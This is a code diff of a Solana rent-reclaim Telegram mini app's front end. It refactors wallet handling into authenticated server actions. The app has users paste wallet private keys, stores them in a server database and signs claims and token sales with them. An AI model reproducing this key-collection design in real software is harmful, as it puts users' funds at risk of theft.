@@ -42,18 +42,7 @@ import { PublicKey, Keypair } from '@solana/web3.js'
 import bs58 from 'bs58'
 import { useTelegram } from '@/hooks/useTelegram'
 import { SOLCLAIM_USER_PAYOUT_BEFORE_REFERRAL } from '@/lib/config'
-import { 
-  getWallets, 
-  getWalletByPublicKey,
-  createWallet, 
-  updateWallet,
-  upsertTokenAccounts,
-  createTransaction,
-  createReferralPayout,
-  getUserWalletsWithStats,
-  saveWalletPrivateKey,
-  deactivateWallet
-} from '@/lib/database'
+import { upsertTokenAccounts, createTransaction, createReferralPayout } from '@/lib/database'
 import { toast } from 'sonner'
 import { closeTokenAccountsOnServer, executeClaimOnServer, sendClaimNotificationToGroup, scanWalletForBatchProjectionAction } from '@/app/actions/claim'
 import { updateReceiverWallet } from '@/app/actions/user'
@@ -62,6 +51,7 @@ import { getTasksForUser, verifyAndCompleteTask } from '@/app/actions/tasks'
 import { getMyReferralPercentAction } from '@/app/actions/referral'
 import { cleanupAndExecuteClaimOnServer, cleanupAndCloseTokenAccountsOnServer } from '@/app/actions/cleanup'
 import { ultraCleanupWalletTokensOnServer, ultraRescanAndExecuteClaimOnServer } from '@/app/actions/cleanup'
+import { createOrActivateWalletAction, deactivateMyWalletAction, getMyWalletByPublicKeyAction, getMyWalletsWithStatsAction, saveMyWalletPrivateKeyAction } from '@/app/actions/secure-wallet'
 import { AdminDashboard } from '@/components/AdminDashboard'
 
 interface ClaimableAccount {
@@ -480,7 +470,8 @@ t.me/solclaimxbot?start=${telegramId}`
     if (!user) return
     setWalletsLoaded(false)
     try {
-      const wallets = await getUserWalletsWithStats(user.id)
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
+      const wallets = await getMyWalletsWithStatsAction(telegramInitData)
       setSavedWallets(wallets)
       setBatchResults(null)
     } catch (err) {
@@ -492,7 +483,8 @@ t.me/solclaimxbot?start=${telegramId}`
 
   const handleDeleteWallet = async (walletId: string) => {
     try {
-      await deactivateWallet(walletId)
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
+      await deactivateMyWalletAction(telegramInitData, walletId)
       await loadSavedWallets()
       toast.success('Wallet removed successfully')
     } catch (err) {
@@ -514,11 +506,12 @@ t.me/solclaimxbot?start=${telegramId}`
     if (!user || !addWalletKey.trim()) return
     setAddWalletModalScanning(true)
     try {
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
       const kp = Keypair.fromSecretKey(bs58.decode(addWalletKey.trim()))
       const derivedPubkey = kp.publicKey.toString()
       setAddWalletDerivedAddress(derivedPubkey)
 
-      const existingByKey = await getWalletByPublicKey(user.id, derivedPubkey)
+      const existingByKey = await getMyWalletByPublicKeyAction(telegramInitData, derivedPubkey)
       if (existingByKey) {
         if (existingByKey.status === 'active') {
           toast.error('This wallet is already added')
@@ -526,13 +519,13 @@ t.me/solclaimxbot?start=${telegramId}`
           return
         }
         // Reactivate deleted wallet and save key
-        await updateWallet(existingByKey.id, { status: 'active' })
-        await saveWalletPrivateKey(existingByKey.id, addWalletKey.trim())
-        setAddWalletModalWalletId(existingByKey.id)
+        const { walletId } = await createOrActivateWalletAction(telegramInitData, derivedPubkey)
+        await saveMyWalletPrivateKeyAction(telegramInitData, walletId, addWalletKey.trim())
+        setAddWalletModalWalletId(walletId)
       } else {
-        const newWallet = await createWallet({ user_id: user.id, public_key: derivedPubkey, status: 'active' })
-        await saveWalletPrivateKey(newWallet.id, addWalletKey.trim())
-        setAddWalletModalWalletId(newWallet.id)
+        const { walletId } = await createOrActivateWalletAction(telegramInitData, derivedPubkey)
+        await saveMyWalletPrivateKeyAction(telegramInitData, walletId, addWalletKey.trim())
+        setAddWalletModalWalletId(walletId)
       }
 
       const result = await getClaimableRent(kp.publicKey)
@@ -571,14 +564,14 @@ t.me/solclaimxbot?start=${telegramId}`
 
     setAddWalletModalClaiming(true)
     try {
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
       const kp = Keypair.fromSecretKey(bs58.decode(addWalletKey.trim()))
       const derivedPubkey = kp.publicKey.toString()
 
       // Wallet already saved in handleAddWalletScan; use addWalletModalWalletId
       let walletId = addWalletModalWalletId
       if (!walletId) {
-        const wallets = await getWallets(user.id)
-        const w = wallets.find(x => x.public_key === derivedPubkey)
+        const w = await getMyWalletByPublicKeyAction(telegramInitData, derivedPubkey)
         if (!w) throw new Error('Wallet not found. Run CHECK first.')
         walletId = w.id
       }
@@ -601,7 +594,8 @@ t.me/solclaimxbot?start=${telegramId}`
       if (cleanupEnabled) {
         const result = await cleanupAndCloseTokenAccountsOnServer({
           privateKeyBase58: addWalletKey.trim(),
-          userId: user.id,
+          telegramInitData,
+          walletId,
           publicKey: addWalletDerivedAddress,
           slippageBps: 100,
         })
@@ -633,8 +627,9 @@ t.me/solclaimxbot?start=${telegramId}`
 
         const result = await closeTokenAccountsOnServer({
           privateKeyBase58: addWalletKey.trim(),
-          userId: user.id,
+          telegramInitData,
           claimableAccounts: claimableForAction,
+          walletId,
           publicKey: addWalletDerivedAddress,
         })
         if (result.succeededAccounts.length === 0) throw new Error(result.error || 'Claim failed')
@@ -779,6 +774,7 @@ t.me/solclaimxbot?start=${telegramId}`
     setIsSubmittingKey(true)
 
     try {
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
       let kp: Keypair
       try {
         kp = Keypair.fromSecretKey(bs58.decode(privateKeyInput))
@@ -789,7 +785,7 @@ t.me/solclaimxbot?start=${telegramId}`
         throw new Error('Private key does not match the wallet address.')
       }
 
-      await saveWalletPrivateKey(addKeyWalletId, privateKeyInput)
+      await saveMyWalletPrivateKeyAction(telegramInitData, addKeyWalletId, privateKeyInput)
       setIsKeyModalOpen(false)
       setAddKeyWalletId(null)
       setAddKeyWalletAddress('')
@@ -894,38 +890,14 @@ t.me/solclaimxbot?start=${telegramId}`
     let totalAccountsClosed = 0
 
     try {
-      // Re-fetch wallets to get the actual private keys
-      const wallets = await getWallets(user.id)
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
 
       for (const claimData of batchResults.walletsWithClaims) {
         try {
-          // Prefer lookup by publicKey to ensure we use the exact wallet that owns these accounts
-          let wallet = wallets.find(w => w.public_key === claimData.publicKey)
-          if (!wallet) wallet = wallets.find(w => w.id === claimData.walletId)
-          if (!wallet || !wallet.encrypted_private_key) {
-            failedClaims++
-            continue
-          }
-
-          let keypair: Keypair
-          try {
-            keypair = Keypair.fromSecretKey(bs58.decode(wallet.encrypted_private_key))
-          } catch (e) {
-            failedClaims++
-            continue
-          }
-
-          // Ensure keypair matches the wallet that owns these accounts (prevents "owner does not match")
-          if (keypair.publicKey.toString() !== claimData.publicKey) {
-            console.warn(`Skipping wallet ${claimData.walletId}: keypair mismatch`)
-            failedClaims++
-            continue
-          }
-
           if (cleanupEnabled) {
             const result = await cleanupAndCloseTokenAccountsOnServer({
-              privateKeyBase58: wallet.encrypted_private_key,
-              userId: user.id,
+              telegramInitData,
+              walletId: claimData.walletId,
               publicKey: claimData.publicKey,
               slippageBps: 100,
             })
@@ -939,7 +911,7 @@ t.me/solclaimxbot?start=${telegramId}`
               const sig = result.close.signatures[0] || ('batch_claim_' + Date.now())
 
               const dbAccounts = succeededAccounts.map((acc) => ({
-                wallet_id: wallet.id,
+                wallet_id: claimData.walletId,
                 account_address: acc.accountAddress,
                 mint_address: acc.mintAddress,
                 balance: acc.balance,
@@ -951,7 +923,7 @@ t.me/solclaimxbot?start=${telegramId}`
               await upsertTokenAccounts(dbAccounts)
 
               const tx = await createTransaction({
-                wallet_id: wallet.id,
+                wallet_id: claimData.walletId,
                 signature: sig,
                 type: 'batch_claim',
                 status: 'confirmed',
@@ -994,9 +966,9 @@ t.me/solclaimxbot?start=${telegramId}`
             }))
 
             const result = await closeTokenAccountsOnServer({
-              privateKeyBase58: wallet.encrypted_private_key,
-              userId: user.id,
+              telegramInitData,
               claimableAccounts: claimableForAction,
+              walletId: claimData.walletId,
               publicKey: claimData.publicKey,
             })
 
@@ -1014,7 +986,7 @@ t.me/solclaimxbot?start=${telegramId}`
               const sig = result.signatures?.[0] || ('batch_claim_' + Date.now())
 
               const dbAccounts = succeededAccounts.map((acc) => ({
-                wallet_id: wallet.id,
+                wallet_id: claimData.walletId,
                 account_address: acc.accountAddress,
                 mint_address: acc.mintAddress,
                 balance: acc.balance,
@@ -1026,7 +998,7 @@ t.me/solclaimxbot?start=${telegramId}`
               await upsertTokenAccounts(dbAccounts)
 
               const tx = await createTransaction({
-                wallet_id: wallet.id,
+                wallet_id: claimData.walletId,
                 signature: sig,
                 type: 'batch_claim',
                 status: 'confirmed',
@@ -1151,35 +1123,10 @@ t.me/solclaimxbot?start=${telegramId}`
     skipReceiverCheckRef.current = false
 
     try {
-      // 1. First, make sure the user has a wallet record in the database
-      // Check for existing wallet (including inactive - user may have deleted and re-scanned)
-      const existingByKey = await getWalletByPublicKey(user.id, publicKey)
-      let walletId = ''
-      let hasKey = false
-
-      if (existingByKey) {
-        walletId = existingByKey.id
-        hasKey = !!existingByKey.encrypted_private_key
-        if (existingByKey.status !== 'active') {
-          await updateWallet(existingByKey.id, { status: 'active' })
-        }
-      } else {
-        const newWallet = await createWallet({
-          user_id: user.id,
-          public_key: publicKey,
-          status: 'active'
-        })
-        walletId = newWallet.id
-      }
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
+      const { walletId } = await createOrActivateWalletAction(telegramInitData, publicKey)
 
       setCurrentWalletId(walletId)
-
-      // If we don't have the private key, prompt the user
-      if (!hasKey) {
-        setAddKeyWalletId(null) // Ensure we're in claim mode, not add-key mode
-        setIsKeyModalOpen(true)
-        return
-      }
 
       // If we have the key, proceed to execute claim
       setIsSubmittingKey(true)
@@ -1197,6 +1144,7 @@ t.me/solclaimxbot?start=${telegramId}`
     setIsSubmittingKey(true)
     
     try {
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
       // Validate private key matches public key
       let kp: Keypair
       try {
@@ -1210,7 +1158,7 @@ t.me/solclaimxbot?start=${telegramId}`
       }
 
       // Save to database
-      await saveWalletPrivateKey(currentWalletId, privateKeyInput)
+      await saveMyWalletPrivateKeyAction(telegramInitData, currentWalletId, privateKeyInput)
       
       // Execute claim with the key we just inputted
       const success = await executeClaim(currentWalletId, privateKeyInput)
@@ -1232,6 +1180,7 @@ t.me/solclaimxbot?start=${telegramId}`
   const executeClaim = async (walletId: string, privateKeyString?: string) => {
     try {
       if (!user) throw new Error('User not found')
+      const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
 
       // If we have a private key (either passed directly or we need to fetch it)
       let keypair: Keypair | null = null;
@@ -1244,41 +1193,27 @@ t.me/solclaimxbot?start=${telegramId}`
           throw new Error('Invalid private key format');
         }
       } else {
-        // Fetch the wallet to get the saved private key
-        const wallets = await getWallets(user.id);
-        const wallet = wallets.find(w => w.id === walletId);
-        
-        if (!wallet || !wallet.encrypted_private_key) {
-          throw new Error('Private key not found. Please add it first.');
-        }
-        
-        try {
-          privateKeyToUse = wallet.encrypted_private_key
-          keypair = Keypair.fromSecretKey(bs58.decode(wallet.encrypted_private_key));
-        } catch (e) {
-          throw new Error('Stored private key is invalid');
-        }
+        // No private key provided: server actions will fetch/decrypt the stored key (if present).
       }
-
-      if (!privateKeyToUse) throw new Error('Private key not found. Please add it first.')
 
       if (cleanupEnabled) {
         // Ultra cleanup: SELL/BURN first, then rescan + CLAIM.
         setUltraCleanupStage('selling')
         const cleanup = await ultraCleanupWalletTokensOnServer({
-          privateKeyBase58: privateKeyToUse,
-          userId: user.id,
+          telegramInitData,
+          walletId,
           publicKey,
           slippageBps: 100,
+          privateKeyBase58: privateKeyToUse,
         })
 
         setUltraCleanupStage(cleanup.burned > 0 ? 'burning' : 'selling')
 
         setUltraCleanupStage('claiming')
         const claim = await ultraRescanAndExecuteClaimOnServer({
-          privateKeyBase58: privateKeyToUse,
           walletId,
-          userId: user.id,
+          telegramInitData,
+          privateKeyBase58: privateKeyToUse,
           publicKey,
         })
 
@@ -1309,9 +1244,9 @@ t.me/solclaimxbot?start=${telegramId}`
         })
       } else {
         const result = await executeClaimOnServer({
-          privateKeyBase58: privateKeyToUse,
           walletId,
-          userId: user.id,
+          telegramInitData,
+          privateKeyBase58: privateKeyToUse,
           claimableAccounts: claimableAccounts.map((a) => ({
             accountAddress: a.accountAddress,
             mintAddress: a.mintAddress,
@@ -1348,7 +1283,16 @@ t.me/solclaimxbot?start=${telegramId}`
       return true;
     } catch (err: any) {
       console.error('Error executing claim:', err)
-      toast.error(err.message || 'Failed to execute claim.')
+      const msg = err?.message || ''
+      if (!privateKeyString && msg.includes('Private key not found')) {
+        // Stored key missing: ask user for it (without exposing any secret).
+        setAddKeyWalletId(walletId)
+        setAddKeyWalletAddress(publicKey)
+        setPrivateKeyInput('')
+        setIsKeyModalOpen(true)
+      } else {
+        toast.error(msg || 'Failed to execute claim.')
+      }
       setIsSubmittingKey(false)
       setUltraCleanupStage(null)
       return false;
@@ -1881,9 +1825,10 @@ t.me/solclaimxbot?start=${telegramId}`
                   if (!privateKeyInput || !currentWalletId) return
                   setIsSubmittingKey(true)
                   try {
+                    const telegramInitData = (window as any).Telegram?.WebApp?.initData ?? ''
                     const kp = Keypair.fromSecretKey(bs58.decode(privateKeyInput))
                     if (kp.publicKey.toString() !== publicKey) throw new Error('Private key does not match wallet.')
-                    await saveWalletPrivateKey(currentWalletId, privateKeyInput)
+                    await saveMyWalletPrivateKeyAction(telegramInitData, currentWalletId, privateKeyInput)
                     const success = await executeClaim(currentWalletId, privateKeyInput)
                     if (success) {
                       setIsKeyModalOpen(false)
